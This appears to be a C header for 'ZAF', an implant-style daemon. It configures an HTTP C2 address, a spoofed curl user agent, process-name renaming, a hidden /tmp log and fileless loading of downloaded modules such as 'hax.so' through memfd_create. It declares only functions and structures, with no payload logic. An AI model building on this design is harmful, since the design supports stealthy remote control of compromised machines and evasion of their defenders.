// ZAF Header file

// logging 
#include "log.h"
#include "zstructs.h"
#include "zsignals.h"
#include "zmodules.h"
#include "zservice.h"
#include "zutil.h"

// ps renaming
#include "spt_status.h"

#ifndef _HAVE_ZAF_H
#define _HAVE_ZAF_H


#define ZCURL_AGENT "libcurl-agent/1.0"    // UA-Agent
#define ZLOG_LEVEL 1    
#define ZPS_NAME "zaf"

#define SHM_NAME " "                       // memfd:<...>
#define __NR_memfd_create 319              // https://code.woboq.org/qt5/include/asm/unistd_64.h.html

// Global daemon log
char *logFile="/tmp/_mf.log";              // Location of the log
int logquiet = 1;                          // 1 - no stderr whatsoever, 0 - stderr + file
FILE *fp;

// Initial modules to download to memory
char *modules[] = { "hax.so" };
//
// HTTP/S C2
char *ccurl="http://127.0.0.1:8080/";




/*** 
 *  Data structures 
 ***/


// Kernel Verison: memfd_create support
/*typedef struct {
    int major;
    int minor;
    int memfd_supp;
} memfd_kv;
memfd_kv memfd_kv_s = {0,0,0};
*/

// Curl Shared Memory write callback
typedef struct {
 int  shm_fd;
 char shm_fname[SHM_NAME_MAX];
 char shm_mname[6];
 int  shm_type; // 1 - shm, 2 - memfd
} Shared_Mem_Fd;





/*** 
 *  Functions
 ***/
int   processCommandReq (int sock, node_t * head);
int   setupCmdP(void);
void  load_so_path(char* path);
void  doWork(void);


extern int   check_empty(node_t * head);
extern void  cleanup_mod_resources(int shm_fd);
extern int   push(node_t * head, int shm_fd, char* path, char * mname, char * mstate);
extern int   push_first(node_t * head, int shm_fd, char* path, char * mname, char * mstate);
extern int   list_sz(node_t * head);
extern void  write_modlist(node_t * head, int sock);
extern int   load_mod(node_t * head, char * url);
extern int   unload_mod(node_t * head, char * name);
extern int   mark_delete_mod(node_t * head, int shm_fd);
extern int   mod_name2fd(node_t * head, char * name, int loaded);
extern char* mod_name2path(node_t * head, char * name);




#endif //_HAVE_ZAF_H

